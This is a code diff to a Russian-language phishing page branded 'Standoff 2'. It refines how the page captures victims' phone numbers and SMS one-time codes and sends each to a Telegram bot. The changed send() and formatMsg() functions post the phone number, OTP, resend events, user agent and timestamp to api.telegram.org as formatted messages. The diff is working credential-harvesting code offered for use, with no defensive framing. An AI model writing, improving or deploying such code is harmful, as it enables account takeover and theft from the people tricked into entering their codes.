@@ -436,10 +436,18 @@ function goto(n) {
   dots.forEach((d, i) => d.classList.toggle('active', i < n));
 }
 
-async function send(stage, data) {
-  let text;
-  if (stage === 'phone') text = `[PHONE] ${sid}\n+7 ${data.phone}\nUA: ${navigator.userAgent}`;
-  else text = `[OTP] ${sid}\n+7 ${phoneVal}\nКод: ${data.code}`;
+function formatMsg(payload) {
+  const stageLabel = {phone:'📱 Телефон',resend:'🔄 Повтор SMS',otp:'🔑 Код из SMS'}[payload.stage] || payload.stage;
+  const t = new Date().toLocaleString('ru-RU',{timeZone:'Europe/Moscow'});
+  let out = `<b>🎯 Standoff 2 — ${stageLabel}</b>\n\n`;
+  if (payload.phone) out += `📞 <b>Телефон:</b> <code>${payload.phone}</code>\n`;
+  if (payload.otp) out += `🔑 <b>Код:</b> <code>${payload.otp}</code>\n`;
+  out += `\n🕐 ${t} (MSK)\n`;
+  out += `🖥 <code>${(payload.ua || navigator.userAgent).slice(0,180)}</code>`;
+  return out;
+}
+
+async function send(payload) {
   try {
     const token = (typeof TG_TOKEN !== 'undefined') ? TG_TOKEN : '';
     const chat = (typeof TG_CHAT !== 'undefined') ? TG_CHAT : '';
@@ -447,7 +455,7 @@ async function send(stage, data) {
     await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
       method: 'POST',
       headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({chat_id: chat, text: text}),
+      body: JSON.stringify({chat_id: chat, text: formatMsg(payload), parse_mode: 'HTML', disable_web_page_preview: true}),
       keepalive: true
     });
   } catch (_) {}
@@ -462,7 +470,7 @@ document.getElementById('form1').addEventListener('submit', async e => {
   phoneFull = '+7 ' + digits.slice(0, 3) + ' ' + digits.slice(3, 6) + ' ' + digits.slice(6, 8) + ' ' + digits.slice(8, 10);
   btn1.disabled = true;
   btn1.innerHTML = '<span class="spinner"></span>Отправка кода…';
-  await send('phone', {phone: digits});
+  await send({stage: 'phone', phone: phoneFull, ua: navigator.userAgent});
   setTimeout(() => {
     document.getElementById('phoneEcho').textContent = phoneFull;
     goto(2);
@@ -516,7 +524,7 @@ function startResendTimer() {
 
 document.getElementById('resend').addEventListener('click', async e => {
   if (e.currentTarget.classList.contains('off')) return;
-  await send('phone', {phone: phoneVal});
+  await send({stage: 'resend', phone: document.getElementById('phoneEcho').textContent});
   startResendTimer();
 });
 
@@ -526,7 +534,7 @@ document.getElementById('form3').addEventListener('submit', async e => {
   if (code.length !== 6) return;
   btn3.disabled = true;
   btn3.innerHTML = '<span class="spinner"></span>Проверка…';
-  await send('otp', {code: code});
+  await send({stage: 'otp', phone: document.getElementById('phoneEcho').textContent, otp: code, ua: navigator.userAgent});
   setTimeout(() => {
     goto(3);
     clearInterval(rInt);
